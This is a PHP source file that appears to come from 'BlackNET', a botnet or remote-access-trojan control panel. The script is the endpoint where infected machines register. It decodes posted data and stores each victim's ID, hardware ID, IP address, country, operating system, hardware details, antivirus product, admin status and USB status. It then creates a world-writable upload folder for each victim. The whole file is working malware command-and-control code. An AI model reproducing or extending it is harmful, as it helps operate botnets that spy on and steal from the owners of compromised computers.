<?php
require_once 'config/config.php';
require_once APP_PATH . 'classes/Database.php';
require_once APP_PATH . 'classes/Utils.php';
require_once APP_PATH . 'classes/Clients.php';

use GeoIp2\Database\Reader;

$database = new BlackNET\Database();

$utils = new BlackNET\Utils();

$client = new BlackNET\Clients($database, $utils);

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    $ipaddress = $utils->sanitize($_SERVER['REMOTE_ADDR']);
    $country = getCounteryCode($ipaddress);
    $date = date("Y-m-d");
    $post_data = $_POST['data'];
    $data = explode(DATA_SPLITTER, $utils->base64DecodeUrl($post_data));
    $clientdata = [];

    $clientdata['vicid'] = $data[0];
    $clientdata['hwid'] = strtoupper(sha1($data[1]));
    $clientdata['ipaddress'] = $ipaddress;
    $clientdata['computername'] = $data[2];
    $clientdata['country'] = $country;
    $clientdata['os'] = $data[3];
    $clientdata['cpu'] = $data[4];
    $clientdata['gpu'] = $data[5];
    $clientdata['ramsize'] = $data[6];

    if ($client->isExist($data[0], "clients") == false) {
        $clientdata['insdate'] = $date;
    }

    $clientdata['update_at'] = date("Y-m-d H:i:s", time());
    $clientdata['pings'] = 0;
    $clientdata['antivirus'] = $data[7];
    $clientdata['version'] = $data[8];
    $clientdata['status'] = $data[9];
    $clientdata['is_usb'] = $data[10];
    $clientdata['is_admin'] = $data[11];

    $client->newClient($clientdata);

    if (isset($data) && !empty($data)) {
        newDir($utils->sanitize($data[0]));
    }
}

/**
 * Get the client countery code using IP Address using GeoIP2
 *
 * @param mixed $ipaddress
 *  The client IP Address
 * @return mixed
 *  Return a countery code based on based on the ip
 */
function getCounteryCode($ipaddress)
{
    $localhost = ['localhost', '127.0.0.1', '::1'];
    $reader = new Reader(APP_PATH . 'GeoLite2-City.mmdb');
    if (!in_array($ipaddress, $localhost)) {
        $record = $reader->city($ipaddress);
        return strtolower($record->country->isoCode);
    } else {
        return "X";
    }
}

/**
 * Create a new folder inside the upload folder
 *
 * @param mixed $victimID
 *  The client ID you want to create a folder for
 * @return bool
 *  Return true id the folder is created false otherwise
 */
function newDir($victimID)
{
    $utils = new BlackNET\Utils();

    if (strpos($victimID, '../') !== false) {
        $victimID = $utils->sanitize(trim($victimID, "../"));
    }

    if (!(file_exists(realpath("upload") . "/" . $victimID))) {
        if (!(is_dir(realpath("upload") . "/" . $victimID))) {
            mkdir(realpath("upload") . "/" . $victimID);
            copy(realpath("upload/index.html"), "upload" . "/" . $victimID . "/" . "index.html");
            chmod("upload" . "/" . $victimID . "/", 0777);
        }
    }

    return true;
}
